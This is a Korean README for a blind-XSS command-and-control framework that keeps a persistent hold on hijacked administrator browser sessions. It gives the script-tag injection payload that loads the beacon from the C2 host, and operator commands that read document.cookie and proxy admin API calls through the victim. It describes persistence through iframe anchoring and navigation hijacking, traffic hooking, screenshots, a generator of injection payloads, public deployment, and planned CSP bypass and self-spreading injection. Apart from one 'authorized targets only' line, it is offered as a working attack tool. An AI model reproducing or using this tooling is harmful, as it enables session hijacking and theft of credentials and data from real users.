# BXConsole v0.3 — blind XSS 상주형 브라우저 제어 프레임워크

blind XSS로 확보한 관리자 브라우저 세션에 **상주(beacon)** 해서 DevTools 콘솔처럼 조작하는 도구.
앵커(self-iframe)로 내비게이션 이탈에도 세션을 유지하고, 명령 큐는 서버 보존이라 세션이 끊겨도 유실되지 않는다.

```
[관리자 브라우저]                              [C2 :7700]                 [운영자 /bxconsole]
저장된 싱크 렌더 → bx.js 실행 ── info/bead ──▶ /b/* 수집 ──▶ Console · Network · Sessions · Payloads
     ▲ EventSource(명령 푸시) ◀────────────── /sse  ◀── /api/send (명령 큐잉)
     └─ eval 실행 → 결과 sendBeacon ─────────▶ /b/result
지속성: XFO 사전검사 → self-iframe 앵커 / DENY면 소프트 내비게이션 하이재킹
```

## 빠른 시작

```bash
# 1) C2 기동
python3 c2/server.py                # :7700 (BX_C2_PORT 로 조정, 0.0.0.0 바인딩)

# 2) 실습 대상 기동 (별도 터미널)
python3 lab/target.py               # :8000

# 3) 주입 — http://127.0.0.1:8000/ 의 폼에 입력:
<script src="http://127.0.0.1:7700/bx.js"></script>

# 4) 피해자 시뮬레이션 — 새 창에서 http://127.0.0.1:8000/admin 열람 (raw 렌더 → 발동)

# 5a) 웹 운영자 — http://127.0.0.1:7700/bxconsole
#   Console  : document.title · await bx.proxy('/profile') · bx.dom.text('h1')
#              /screenshot (썸네일+확대) · /html (페이지 덤프) · /proxy <url>
#   Network  : fetch/XHR/리소스/WS/SSE 캡처, 상태·메소드·바디 검색, HAR 내보내기
#   Sessions : 상태 점(🟢🟡🔴), 휴지통(Delete→Restore/Purge)
#   Payloads : 주입용 XSS 페이로드 생성기 (C2 주소 자동 치환·복사)

# 5b) CLI 운영자 (별도 터미널)
python3 c2/cli.py
# bx[?] › ls | sel 0 | net | proxy /admin/api/users | document.cookie
```

## 용어·설계

- **채널 이중화**: SSE(푸시) + 폴링 폴백 동시 운용, 명령 `cid`로 중복 제거
- **명령 큐 보존**: 피해자가 이탈해도 큐는 서버에 남고, 다음 트리거 때 실행
- **앵커**: XFO 사전검사 후 self-iframe 재배치 — 최상위 프레임이 컨트롤러로 생존. DENY면 소프트 내비게이션 하이재킹
- **컨텍스트 유지**: `window.__bx` 오브젝트가 명령 간 살아있음 (변수 보관 가능)
- **피해자 실제 문서**: `bx.doc()` — anchor 모드에서 top은 껍데기이므로 `frames[0]`(동일 출처)를 해석. 스크린샷(`bx.shot()`)·HTML 덤프(`bx.htmldump()`)는 전부 이 문서 기준
- **네트워크 훅**: top + iframe 모두 설치 — fetch/XHR(요청·응답 바디, 헤더, content-type, size, 실패) + PerformanceObserver(img/css 리소스) + WebSocket/SSE/sendBeacon 래핑

## 세션 워크스페이스 (sessions/)

피해자가 연결되면 세션 디렉터리가 생성되고 모든 수집물이 파일로 기록된다. 재시작 시 자동 복원.

```
sessions/
├─ .purged.json          # 완전파기된 vid 인덱스 — 재등록 영구 차단(고스트 방지)
├─ {vid}/
│  ├─ meta.json          # 신원/상태 (first·last·url·bn·mode·ua·name, closed)
│  ├─ commands.jsonl     # push 시점부터 기록 — 재시작 시 in-flight 명령도 재큐
│  ├─ console.jsonl      # 피해자 console.* / onerror 캡처
│  ├─ net.jsonl          # 네트워크 훅 캡처
│  ├─ pageinfo.json      # 첫 연결 자동수집
│  ├─ htmldump.html      # DOM 스냅샷 (청크 조립본)
│  └─ screenshot.jpg     # 화면 스냅샷 (바이너리)
└─ .trash/{vid}/         # Delete → 이동(soft). Restore 또는 Purge
```

- **Delete**(soft) = `.trash/` 이동, 웹에서 숨김, 같은 vid 재비컨 무시
- **Restore** = `.trash/` → 복귀 (웹 Sessions 탭의 TRASH 영역)
- **Purge**(hard) = 디렉터리 영구 삭제 + `.purged.json` 기록 + evidence 원장에 기록
- `evidence/sessions-YYYYMMDD.jsonl`은 별도 append-only 원장 (beat 제외 전 비컨)

## 운영자 콘솔 (/bxconsole)

- **상태 점**: 🟢 live(≤5s) → 🟡 stale(≤35s, 비컨 지연) → 🔴 red(>35s & SSE 없음 = 완전 끊김) / ⚪ closed
- **탭 ✕** = 콘솔에서만 숨김(세션 생존), Sessions 패널 클릭으로 복원
- **콘솔 스트림**: auto-collect·명령/결과·victim 콘솔이 하나의 시간순 스트림으로 출력 — 슬래시 명령의 큰 뷰(썸네일/링크)도 명령 바로 아래
- **`/screenshot`** — 피해자 화면 썸네일(전체 해상도), 클릭 시 라이트박스 확대
- **`/html`** — 실제 페이지 덤프 링크, 클릭 시 새 탭에서 페이지 뷰
- **Payloads 탭** — C2 주소 자동 치환되는 주입 페이로드 20종(basic/breakout/handler/encoding) + **Console trigger**(피해자 DevTools 콘솔에 붙여넣는 JS 3종). C2 base는 수동 오버라이드 가능(입력값 localStorage 영속)

## 서버 배포 (다른 머신에서 구동)

- **요구사항**: Python 3.8+ — **표준 라이브러리만 사용**(외부 패키지 없음). html2canvas는 피해자 브라우저가 CDN에서 로드
- **클론**: `git clone https://github.com/NGA99/bxconsole.git` (비공개 리포지토리는 deploy key 또는 PAT)
- **기동**: `python3 c2/server.py` — 이미 `0.0.0.0` 바인딩이라 LAN/공개 인터페이스 즉시 수신
- **C2 주소 자동 적응**: `/bx.js`는 요청의 Host 헤더로 자기 주소를 치환 — 피해자가 도달한 주소가 곧 페이로드 주소
- **systemd 예제**:
  ```ini
  [Service]
  WorkingDirectory=/opt/bxconsole
  ExecStart=/usr/bin/python3 c2/server.py
  Restart=always
  [Install]
  WantedBy=multi-user.target
  ```
- **운영 주의**:
  - `/bxconsole`는 인증 없음(v0.4 예정) — 방화벽 제한 또는 역프록시 basic auth 필수
  - https 페이지 대상이면 C2도 TLS 권장(mixed content로 스크립트 로드 차단됨)
  - 공개(https) 페이지가 localhost/사설 IP로 요청하면 Chrome Local Network Access 권한 프롬프트 발생 — nav 채널 또는 공개 주소 서빙으로 회피
  - `sessions/`·`evidence/`는 민감 데이터 — 리포지토리에 커밋되지 않음(.gitignore), 서버 간 이전은 디렉터리 복사

## 증거

모든 비컨(beat 제외)은 `evidence/sessions-YYYYMMDD.jsonl` 에 JSONL 누적 — 원장(result/ledger.md) 연계용.
세션 삭제/파기 이벤트도 원장에 기록된다.

## 로드맵

- ~~v0.2: 브라우저 프록시(fetch 대행+청크), fetch/XHR 훅, 운영자 CLI 리플~~ ✔ 완료
- ~~v0.3: 자동수집(pageinfo·HTML 덤프·스크린샷), 세션 워크스페이스 영속화, 휴지통(restore/purge), 네트워크 탭 고도화, Payloads 탭~~ ✔ 완료
- v0.4: 싱크 확산(폼 자동 주입), CSP bypass 페이로드 섹션 + nav-beacon 엔드포인트, 운영자 인증(토큰), 알림(Telegram), CDP 연동, C2 TLS/인증 배포 가이드

## 주의

**승인된 대상에만 사용.** 수집 데이터(쿠키·localStorage·스크린샷)는 민감할 수 있으므로 evidence 보호 필수. 세션 삭제는 soft(휴지통), 파기는 영구 삭제다.
